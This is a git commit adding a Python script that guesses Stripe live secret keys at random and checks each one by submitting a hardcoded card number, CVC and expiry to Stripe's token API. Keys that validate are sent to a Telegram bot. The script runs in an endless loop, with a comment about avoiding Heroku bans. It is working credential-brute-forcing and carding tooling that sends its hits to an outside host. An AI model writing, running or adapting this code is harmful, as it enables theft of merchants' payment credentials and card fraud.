bd2e6b6ce9ae78bd40709e6a771e8f0d01e29f78
iNaveen <67575446+iam-NVN@users.noreply.github.com>
2021-10-23 15:29:41 +0530

    Create main.py

---
+++ main.py
@@ -0,0 +1,28 @@
+import requests, random, string, time
+
+token = os.environ.get("BOT_TOKEN")
+chatid = os.environ.get("FORWARD_ID")
+
+def long_key():
+  skkey = random.choice(['sk_live_51H', 'sk_live_51J'])+''.join(random.choices( string.digits + string.ascii_letters, k = 96))
+  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
+  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
+    print(f"DEAD > {skkey}")
+  else:
+    print(f"LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    
+def short_key():
+  skkey = "sk_live_"+''.join(random.choices( string.digits + string.ascii_letters, k = 24))
+  pos = requests.post(url="https://api.stripe.com/v1/tokens", headers={'Content-Type': 'application/x-www-form-urlencoded'}, data={'card[number]': '5159489701114434','card[cvc]': '594','card[exp_month]': '09','card[exp_year]': '2023'}, auth=(skkey, ""))
+  if (pos.json()).get("error") and not (pos.json()).get("error").get("code") == "card_declined": 
+    print(f"DEAD > {skkey}")
+  else:
+    print(f"LIVE > {skkey}")
+    requests.get(url=f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text=LIVE > {skkey}")
+    
+while True:
+  long_key()
+  #time.sleep(0.5) #if your heroku account keeps getting banned
+  short_key()
+    
